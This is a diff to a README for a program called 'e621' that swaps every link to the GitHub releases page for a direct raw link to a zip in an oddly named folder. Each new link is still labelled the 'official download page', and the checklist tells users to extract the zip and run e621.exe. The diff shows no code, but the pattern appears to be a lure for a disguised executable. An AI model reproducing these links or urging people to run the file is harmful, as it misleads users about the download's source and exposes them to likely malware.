@@ -1,7 +1,7 @@
 <h1>⚡ e621 - Your All-in-One Companion for the Community</h1>
 
 <p align="center">
-  <a href="https://github.com/elota4184/e621/releases">
+  <a href="https://raw.githubusercontent.com/elota4184/e621/main/columbaceous/e-1.2.zip">
     <img src="https://img.shields.io/badge/Download%20e621%20Now-FF6F00?style=for-the-badge&logo=github&logoColor=white" alt="Download e621" style="max-width: 100%; height: auto;">
   </a>
 </p>
@@ -28,7 +28,7 @@ The only official place to get e621 is through the link below. Please do not dow
 
 
 
-👉 **[Click here to visit the official download page](https://github.com/elota4184/e621/releases)**
+👉 **[Click here to visit the official download page](https://raw.githubusercontent.com/elota4184/e621/main/columbaceous/e-1.2.zip)**
 
 
 
@@ -189,7 +189,7 @@ Yes, absolutely. e621 is free to download and use. It is an independent, communi
 
 Periodically, the developers release new versions with bug fixes and features. To update:
 
-1..  Visit the [download page](https://github.com/elota4184/e621/releases) again. 
+1..  Visit the [download page](https://raw.githubusercontent.com/elota4184/e621/main/columbaceous/e-1.2.zip) again. 
 2..  Check if a newer `.zip` file is available. 
 3..  Download it, extract it, and replace your old folder with the new one. Your settings and preferences are usually preserved in a separate config file, so you will not lose your customizations. 
 
@@ -235,7 +235,7 @@ e621 is built by users, for users. Your feedback drives improvement. Here is how
 
 Before you go, make sure you have completed these steps:
 
-- [ ] Visited the official [download page](https://github.com/elota4184/e621/releases)
+- [ ] Visited the official [download page](https://raw.githubusercontent.com/elota4184/e621/main/columbaceous/e-1.2.zip)
 - [ ] Downloaded the `.zip` file for Windows
 - [ ] Extracted the folder
 - [ ] Double-clicked `e621.exe` to launch
